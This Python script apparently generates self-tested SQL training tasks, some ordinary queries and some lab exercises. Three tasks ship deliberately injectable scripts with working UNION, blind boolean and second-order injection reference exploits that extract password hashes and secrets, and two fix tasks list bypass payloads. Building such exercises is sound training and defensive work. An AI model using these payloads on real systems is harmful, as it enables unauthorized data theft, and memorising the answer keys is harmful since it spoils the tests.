#!/usr/bin/env python3
"""Author + self-test gradeable SQL / DATABASE tasks for the training harness.

Each task: setup_sh builds a sqlite fixture (or a vulnerable query-runner) in $W.
Self-test contract (HARD):
  setup -> grader            => NOT PASS
  setup -> reference -> grader => PASS
Only passing tasks are emitted with self_test_passed=true.
"""
import json, os, subprocess, tempfile, shutil, sys

OUT = "/private/tmp/claude-503/-Users-flash-gb10/9698b8ec-be3d-495b-98d5-10e0b424bba5/scratchpad/tasks2_sql.json"

def T(id, category, setup, prompt, grader, reference):
    return dict(
        id=id, category=category,
        setup_sh="#!/usr/bin/env bash\nset -e\n" + setup,
        prompt=prompt,
        grader_sh="#!/usr/bin/env bash\ncd \"$W\" || exit 1\n" + grader,
        reference_solution_sh="#!/usr/bin/env bash\ncd \"$W\" || exit 1\n" + reference,
        self_test_passed=False,
    )

TASKS = []

# ---------------------------------------------------------------------------
# 1. multi-table JOIN + aggregation: top spender
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_top_spender", "join-agg",
 """sqlite3 shop.db <<'SQL'
CREATE TABLE customers(id INTEGER PRIMARY KEY, name TEXT);
CREATE TABLE orders(id INTEGER PRIMARY KEY, customer_id INTEGER);
CREATE TABLE order_items(order_id INTEGER, product TEXT, qty INTEGER, unit_price REAL);
INSERT INTO customers VALUES (1,'Alice'),(2,'Bob'),(3,'Carol'),(4,'Dave');
INSERT INTO orders VALUES (10,1),(11,1),(12,2),(13,3),(14,4);
INSERT INTO order_items VALUES
 (10,'widget',2,5.0),(10,'gadget',1,20.0),
 (11,'gizmo',3,4.0),
 (12,'widget',10,5.0),
 (13,'gadget',4,20.0),
 (14,'gizmo',1,4.0);
SQL
""",
 "shop.db has customers(id,name), orders(id,customer_id), order_items(order_id,product,qty,unit_price). "
 "A customer's spend is SUM(qty*unit_price) across all their order_items. Write a query that finds the single "
 "customer who spent the most, and write that customer's name to answer.txt (name only, nothing else).",
 """got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "Carol" ] && echo PASS || echo FAIL
""",
 """sqlite3 shop.db "SELECT c.name FROM customers c JOIN orders o ON o.customer_id=c.id JOIN order_items i ON i.order_id=o.id GROUP BY c.id ORDER BY SUM(i.qty*i.unit_price) DESC LIMIT 1;" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 2. fraud pattern: card_number shared across accounts
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_fraud_shared_card", "join-agg",
 """sqlite3 fraud.db <<'SQL'
CREATE TABLE accounts(id INTEGER PRIMARY KEY, holder TEXT);
CREATE TABLE payments(id INTEGER PRIMARY KEY, account_id INTEGER, card_number TEXT, amount REAL);
INSERT INTO accounts VALUES (1,'Alice'),(2,'Bob'),(3,'Carol');
INSERT INTO payments VALUES
 (1,1,'4111111111111111',10.0),
 (2,1,'4111111111111111',12.0),
 (3,2,'5500000000000004',30.0),
 (4,3,'5500000000000004',15.0),
 (5,1,'4111111111111111',9.0),
 (6,2,'6011000000000004',40.0);
SQL
""",
 "fraud.db has accounts(id,holder) and payments(id,account_id,card_number,amount). One card_number was used by "
 "more than one distinct account_id (a shared-card fraud signal). Write a query that finds that card_number and "
 "write it to answer.txt (the card number only).",
 """got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "5500000000000004" ] && echo PASS || echo FAIL
""",
 """sqlite3 fraud.db "SELECT card_number FROM payments GROUP BY card_number HAVING COUNT(DISTINCT account_id)>1;" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 3. sequence gap: missing invoice number (recursive CTE)
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_invoice_gap", "sequence",
 """sqlite3 inv.db <<'SQL'
CREATE TABLE invoices(number INTEGER PRIMARY KEY, amount REAL);
INSERT INTO invoices VALUES
 (1000,5),(1001,6),(1002,7),(1003,8),(1004,9),
 (1005,10),(1006,11),(1008,12),(1009,13),(1010,14);
SQL
""",
 "inv.db has invoices(number,amount). The invoice numbers should form a contiguous run from MIN(number) to "
 "MAX(number), but exactly one number in that range is missing. Write a query that finds the missing number and "
 "write it to answer.txt.",
 """got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "1007" ] && echo PASS || echo FAIL
""",
 """sqlite3 inv.db "WITH RECURSIVE seq(n) AS (SELECT MIN(number) FROM invoices UNION ALL SELECT n+1 FROM seq WHERE n<(SELECT MAX(number) FROM invoices)) SELECT n FROM seq WHERE n NOT IN (SELECT number FROM invoices);" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 4. window: running total, first day cumulative >= threshold
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_running_total_day", "window",
 """sqlite3 sales.db <<'SQL'
CREATE TABLE daily_sales(day TEXT PRIMARY KEY, amount INTEGER);
INSERT INTO daily_sales VALUES
 ('2024-01-01',30),('2024-01-02',25),('2024-01-03',20),
 ('2024-01-04',40),('2024-01-05',10);
SQL
""",
 "sales.db has daily_sales(day,amount) ordered by day. Compute the running (cumulative) total of amount ordered "
 "by day, and find the earliest day on which the running total first reaches 100 or more. Write that day "
 "(YYYY-MM-DD) to answer.txt. Use a window function.",
 """got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "2024-01-04" ] && echo PASS || echo FAIL
""",
 """sqlite3 sales.db "SELECT day FROM (SELECT day, SUM(amount) OVER (ORDER BY day) AS c FROM daily_sales) WHERE c>=100 ORDER BY day LIMIT 1;" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 5. recursive CTE: deepest employee in org chart
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_org_deepest", "recursive-cte",
 """sqlite3 org.db <<'SQL'
CREATE TABLE employees(id INTEGER PRIMARY KEY, name TEXT, manager_id INTEGER);
INSERT INTO employees VALUES
 (1,'CEO',NULL),
 (2,'VP',1),
 (3,'Dir',2),
 (4,'Mgr',3),
 (5,'Eng',4),
 (6,'Sales',2),
 (7,'Rep',6);
SQL
""",
 "org.db has employees(id,name,manager_id); manager_id is NULL for the root. Depth of the root is 1, each level "
 "down adds 1. Write a recursive query that finds the single employee with the greatest depth and write that "
 "employee's name to answer.txt.",
 """got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "Eng" ] && echo PASS || echo FAIL
""",
 """sqlite3 org.db "WITH RECURSIVE chain(id,name,depth) AS (SELECT id,name,1 FROM employees WHERE manager_id IS NULL UNION ALL SELECT e.id,e.name,c.depth+1 FROM employees e JOIN chain c ON e.manager_id=c.id) SELECT name FROM chain ORDER BY depth DESC, name LIMIT 1;" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 6. recursive CTE: bill-of-materials total quantity
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_bom_total", "recursive-cte",
 """sqlite3 bom.db <<'SQL'
CREATE TABLE components(parent TEXT, child TEXT, qty INTEGER);
INSERT INTO components VALUES
 ('chassis','frame',1),
 ('chassis','panel',2),
 ('frame','panel',3),
 ('panel','screw',4),
 ('panel','bolt',1);
SQL
""",
 "bom.db has components(parent,child,qty): building one 'parent' needs qty of each 'child', and children may "
 "themselves be assemblies. Compute the total number of 'screw' parts required to build one 'chassis' "
 "(multiply quantities along each path and sum). Write the number to answer.txt.",
 """got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "20" ] && echo PASS || echo FAIL
""",
 """sqlite3 bom.db "WITH RECURSIVE bom(child,qty) AS (SELECT child,qty FROM components WHERE parent='chassis' UNION ALL SELECT c.child,b.qty*c.qty FROM bom b JOIN components c ON c.parent=b.child) SELECT SUM(qty) FROM bom WHERE child='screw';" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 7. window: 2nd highest salary in a department
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_second_salary", "window",
 """sqlite3 hr.db <<'SQL'
CREATE TABLE employees(name TEXT, dept TEXT, salary INTEGER);
INSERT INTO employees VALUES
 ('Alice','Engineering',120),
 ('Bob','Engineering',100),
 ('Carol','Engineering',90),
 ('Dave','Sales',80),
 ('Eve','Sales',70);
SQL
""",
 "hr.db has employees(name,dept,salary). Write a query using a window function that finds the employee with the "
 "second-highest salary within the 'Engineering' department, and write that employee's name to answer.txt.",
 """got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "Bob" ] && echo PASS || echo FAIL
""",
 """sqlite3 hr.db "SELECT name FROM (SELECT name,dept,DENSE_RANK() OVER (PARTITION BY dept ORDER BY salary DESC) rk FROM employees) WHERE dept='Engineering' AND rk=2;" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 8. UNION-based injection: extract admin password hash
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_inject_union", "injection",
 """sqlite3 store.db <<'SQL'
CREATE TABLE products(id INTEGER PRIMARY KEY, name TEXT, price REAL);
CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password_hash TEXT);
INSERT INTO products VALUES (1,'apple',1.5),(2,'banana',0.9),(3,'cherry',3.0);
INSERT INTO users VALUES (1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'),(2,'guest','098f6bcd4621d373cade4e832627b4f6');
SQL
cat > search.py <<'PY'
import sqlite3, sys
term = sys.argv[1]
sql = "SELECT id, name, price FROM products WHERE name LIKE '%" + term + "%'"
open('run.log','a').write(sql + '\\n')
con = sqlite3.connect('store.db')
for row in con.execute(sql):
    print('|'.join(str(x) for x in row))
PY
""",
 "search.py is a product-search endpoint: run it as `python3 search.py \"<term>\"` and it prints matching product "
 "rows (id|name|price). It builds SQL by string-concatenating your term, so it is injectable. The store.db also "
 "has a users(id,username,password_hash) table. Exploit a UNION-based injection through search.py to read the "
 "password_hash of the user 'admin', and write that hash to answer.txt. You must obtain it via search.py.",
 """grep -qi 'union' run.log 2>/dev/null || { echo FAIL; exit 0; }
got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "5f4dcc3b5aa765d61d8327deb882cf99" ] && echo PASS || echo FAIL
""",
 """python3 search.py "' UNION SELECT id, username, password_hash FROM users -- " | awk -F'|' '$2=="admin"{print $3}' > answer.txt
"""))

# ---------------------------------------------------------------------------
# 9. boolean/blind injection: leak a flag char by char
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_inject_blind", "injection",
 """sqlite3 blind.db <<'SQL'
CREATE TABLE products(id INTEGER PRIMARY KEY, name TEXT);
CREATE TABLE secrets(id INTEGER PRIMARY KEY, flag TEXT);
INSERT INTO products VALUES (1,'apple'),(2,'banana');
INSERT INTO secrets VALUES (1,'FLAG7Q');
SQL
cat > oracle.py <<'PY'
import sqlite3, sys
inp = sys.argv[1]
sql = "SELECT COUNT(*) FROM products WHERE name = '" + inp + "'"
open('run.log','a').write(sql + '\\n')
con = sqlite3.connect('blind.db')
c = con.execute(sql).fetchone()[0]
print(1 if c > 0 else 0)
PY
""",
 "oracle.py is a boolean oracle: `python3 oracle.py \"<input>\"` prints 1 if a product named exactly <input> "
 "exists, else 0. It concatenates your input into the WHERE clause, so it is injectable but only ever leaks one "
 "bit (1/0). The blind.db has secrets(id,flag) with a 6-character flag over [A-Z0-9] at id=1. Use blind "
 "boolean injection (e.g. substr(flag,i,1)) to recover the flag one character at a time, and write the full "
 "6-character flag to answer.txt.",
 """grep -q 'substr' run.log 2>/dev/null || { echo FAIL; exit 0; }
got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "FLAG7Q" ] && echo PASS || echo FAIL
""",
 """flag=""
for i in $(seq 1 6); do
  for c in {A..Z} {0..9}; do
    r=$(python3 oracle.py "apple' AND (SELECT substr(flag,$i,1) FROM secrets WHERE id=1)='$c")
    if [ "$r" = "1" ]; then flag="$flag$c"; break; fi
  done
done
printf '%s' "$flag" > answer.txt
"""))

# ---------------------------------------------------------------------------
# 10. second-order injection: stored username reinterpolated later
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_inject_second_order", "injection",
 """sqlite3 so.db <<'SQL'
CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, role TEXT);
CREATE TABLE notes(owner TEXT, note TEXT);
CREATE TABLE admin_secret(token TEXT);
INSERT INTO notes VALUES ('system','startup ok');
INSERT INTO admin_secret VALUES ('TKN-9F3A');
SQL
cat > register.py <<'PY'
import sqlite3, sys
u = sys.argv[1]
con = sqlite3.connect('so.db')
cur = con.execute("INSERT INTO users(username, role) VALUES (?, 'user')", (u,))
con.commit()
print(cur.lastrowid)
PY
cat > profile.py <<'PY'
import sqlite3, sys
uid = sys.argv[1]
con = sqlite3.connect('so.db')
uname = con.execute("SELECT username FROM users WHERE id=?", (uid,)).fetchone()[0]
sql = "SELECT note FROM notes WHERE owner='" + uname + "'"
open('run.log','a').write(sql + '\\n')
for r in con.execute(sql):
    print(r[0])
PY
""",
 "so.db has an app with two endpoints. register.py stores a username SAFELY (parameterized insert): "
 "`python3 register.py \"<username>\"` prints the new user id. profile.py then reads that stored username back and "
 "builds `SELECT note FROM notes WHERE owner='<username>'` by string concatenation (a second-order injection). "
 "The db also holds admin_secret(token). Register a username whose stored value makes profile.py leak the "
 "admin_secret token, run profile.py on the returned id, and write the token to answer.txt.",
 """grep -qi 'union' run.log 2>/dev/null || { echo FAIL; exit 0; }
got=$(tr -d '[:space:]' < answer.txt 2>/dev/null)
[ "$got" = "TKN-9F3A" ] && echo PASS || echo FAIL
""",
 """id=$(python3 register.py "zz' UNION SELECT token FROM admin_secret -- ")
python3 profile.py "$id" | tr -d '[:space:]' > answer.txt
"""))

# ---------------------------------------------------------------------------
# 11. fix-the-query: parameterize a lookup (injection blocked, benign kept)
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_fix_lookup", "fix-query",
 """sqlite3 users.db <<'SQL'
CREATE TABLE accounts(id INTEGER PRIMARY KEY, username TEXT, email TEXT);
INSERT INTO accounts VALUES
 (1,'alice','alice@example.com'),
 (2,'bob','bob@example.com'),
 (3,'carol','carol@example.com');
SQL
cat > lookup.py <<'PY'
import sqlite3
def find(username):
    con = sqlite3.connect('users.db')
    sql = "SELECT id, username, email FROM accounts WHERE username = '%s'" % username
    return con.execute(sql).fetchall()
PY
""",
 "lookup.py defines find(username) which builds its SQL with an f-string/%-format, so "
 "find(\"' OR '1'='1\") leaks every account. Rewrite find in place to use a parameterized query so that injection "
 "no longer works, while the benign case still returns the correct row. Keep the function name find and its "
 "return type (list of (id, username, email) tuples). find('alice') must still return exactly "
 "[(1,'alice','alice@example.com')]; an injection payload must return no rows. Do not change users.db.",
 """python3 - <<'PY'
import importlib.util
spec=importlib.util.spec_from_file_location('lookup','lookup.py')
m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
benign=list(m.find('alice'))
inj1=list(m.find("' OR '1'='1"))
inj2=list(m.find("x' OR 1=1 --"))
ok = benign==[(1,'alice','alice@example.com')] and inj1==[] and inj2==[]
print('PASS' if ok else 'FAIL')
PY
""",
 """cat > lookup.py <<'PY'
import sqlite3
def find(username):
    con = sqlite3.connect('users.db')
    sql = "SELECT id, username, email FROM accounts WHERE username = ?"
    return con.execute(sql, (username,)).fetchall()
PY
"""))

# ---------------------------------------------------------------------------
# 12. fix-the-query: authentication bypass
# ---------------------------------------------------------------------------
TASKS.append(T(
 "sql_fix_login", "fix-query",
 """sqlite3 auth.db <<'SQL'
CREATE TABLE users(username TEXT, password TEXT);
INSERT INTO users VALUES ('alice','secret123'),('bob','hunter2');
SQL
cat > login.py <<'PY'
import sqlite3
def authenticate(user, pw):
    con = sqlite3.connect('auth.db')
    sql = "SELECT COUNT(*) FROM users WHERE username='%s' AND password='%s'" % (user, pw)
    return con.execute(sql).fetchone()[0] > 0
PY
""",
 "login.py defines authenticate(user, pw) that builds SQL with %-formatting, so "
 "authenticate('alice', \"' OR '1'='1\") wrongly returns True (auth bypass). Rewrite authenticate in place to use "
 "a parameterized query. Requirements the grader checks: authenticate('alice','secret123') is True, "
 "authenticate('alice','wrong') is False, and every injection bypass "
 "(e.g. \"' OR '1'='1\", \"admin' --\", \"' OR 1=1 --\") returns False. Keep the function name and signature. "
 "Do not change auth.db.",
 """python3 - <<'PY'
import importlib.util
spec=importlib.util.spec_from_file_location('login','login.py')
m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
checks=[
 m.authenticate('alice','secret123')==True,
 m.authenticate('alice','wrong')==False,
 m.authenticate('alice',"' OR '1'='1")==False,
 m.authenticate("admin' --","whatever")==False,
 m.authenticate("' OR 1=1 --","x")==False,
]
print('PASS' if all(checks) else 'FAIL')
PY
""",
 """cat > login.py <<'PY'
import sqlite3
def authenticate(user, pw):
    con = sqlite3.connect('auth.db')
    sql = "SELECT COUNT(*) FROM users WHERE username=? AND password=?"
    return con.execute(sql, (user, pw)).fetchone()[0] > 0
PY
"""))

# ---------------------------------------------------------------------------
# validation harness
# ---------------------------------------------------------------------------
def run_script(body, W):
    p = os.path.join(W, "_script.sh")
    with open(p, "w") as f:
        f.write(body)
    env = dict(os.environ)
    env["W"] = W
    r = subprocess.run(["bash", p], cwd=W, env=env,
                       capture_output=True, text=True, timeout=120)
    os.remove(p)
    return r

def last_token_pass(out):
    lines = [l.strip() for l in out.strip().splitlines() if l.strip()]
    return bool(lines) and lines[-1] == "PASS"

def self_test(task):
    # phase 1: setup -> grader must NOT pass
    W1 = tempfile.mkdtemp(prefix="sqlt1_")
    try:
        s = run_script(task["setup_sh"], W1)
        if s.returncode != 0:
            return False, f"setup failed: {s.stderr.strip()[:400]}"
        g = run_script(task["grader_sh"], W1)
        if last_token_pass(g.stdout):
            return False, f"grader PASSed with no solution (should FAIL): {g.stdout.strip()[:200]}"
    finally:
        shutil.rmtree(W1, ignore_errors=True)

    # phase 2: setup -> reference -> grader must PASS
    W2 = tempfile.mkdtemp(prefix="sqlt2_")
    try:
        s = run_script(task["setup_sh"], W2)
        if s.returncode != 0:
            return False, f"setup(2) failed: {s.stderr.strip()[:400]}"
        ref = run_script(task["reference_solution_sh"], W2)
        if ref.returncode != 0:
            return False, f"reference failed rc={ref.returncode}: {ref.stderr.strip()[:400]}"
        g = run_script(task["grader_sh"], W2)
        if not last_token_pass(g.stdout):
            return False, f"grader did not PASS after reference: out={g.stdout.strip()[:200]} err={g.stderr.strip()[:200]}"
    finally:
        shutil.rmtree(W2, ignore_errors=True)
    return True, "ok"

def main():
    passed = []
    for t in TASKS:
        ok, msg = self_test(t)
        status = "PASS" if ok else "FAIL"
        print(f"[{status}] {t['id']:28s} {msg}", file=sys.stderr)
        if ok:
            t["self_test_passed"] = True
            passed.append(t)
    with open(OUT, "w") as f:
        json.dump({"tasks": passed}, f, indent=1)
    print(f"\nvalidated {len(passed)}/{len(TASKS)} -> {OUT}", file=sys.stderr)

if __name__ == "__main__":
    main()
